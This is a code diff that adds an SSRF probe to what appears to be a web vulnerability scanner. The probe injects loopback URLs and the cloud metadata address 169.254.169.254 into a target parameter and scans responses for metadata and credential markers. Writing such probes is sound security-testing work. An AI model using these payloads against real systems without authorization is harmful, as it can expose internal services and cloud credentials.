@@ -347,3 +347,55 @@ def probe_idor(ctx: Context, url: str) -> dict:
             "results": results,
             "note": "confirm before recording: the second object must belong "
                     "to a different principal (name/id inside the body)"}
+
+
+_SSRF_MARKERS = re.compile(
+    r"ami-id|instance-id|local-hostname|local-ipv4|security-credentials|"
+    r"computeMetadata|Metadata-Flavor|XAwsEc2|iam/info",
+    re.I,
+)
+
+
+def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
+    """SSRF matched-pair: baseline is an unresolvable canary host, then
+    internal URLs (self-fetch on the target's own port, loopback name,
+    cloud metadata). A 200 whose body differs from the canary error - with
+    the injected URL itself stripped out - is the signal."""
+    p = urllib.parse.urlparse(url)
+    port = p.port or (443 if p.scheme == "https" else 80)
+    canary = f"http://{_marker('nrf')}.invalid/"
+    base = _send(ctx, url, param, canary, tool="probe_ssrf",
+                 note="unresolvable canary")
+    base_body = (base.get("body") or "").replace(canary, "")
+
+    payloads = [
+        ("self-fetch", f"http://127.0.0.1:{port}/"),
+        ("loopback-name", f"http://localhost:{port}/"),
+        ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
+    ]
+    hits = []
+    for name, target in payloads:
+        r = _send(ctx, url, param, target, tool="probe_ssrf", note=name)
+        body = r.get("body") or ""
+        marker = _SSRF_MARKERS.search(body)
+        sim = _similarity(body.replace(target, ""), base_body)
+        hits.append({
+            "name": name, "target": target, "status": r["status"],
+            "request_id": r["request_id"],
+            "similarity_to_canary": sim,
+            "marker": marker.group(0) if marker else None,
+            "differs": sim < 0.75 or r["status"] != base["status"],
+        })
+    strong = next((h for h in hits if h["marker"]), None)
+    cand = next((h for h in hits if h["differs"] and h["status"] == 200), None)
+    if strong:
+        verdict = ("ssrf candidate: internal-content marker "
+                   f"'{strong['marker']}' in response to {strong['name']}")
+    elif cand:
+        verdict = ("ssrf lead: internal URL returned 200 with different "
+                   f"content than the canary ({cand['name']}) - confirm "
+                   "the fetched body is really server-side output")
+    else:
+        verdict = "no ssrf signal"
+    return {"verdict": verdict, "canary_id": base["request_id"],
+            "results": hits}
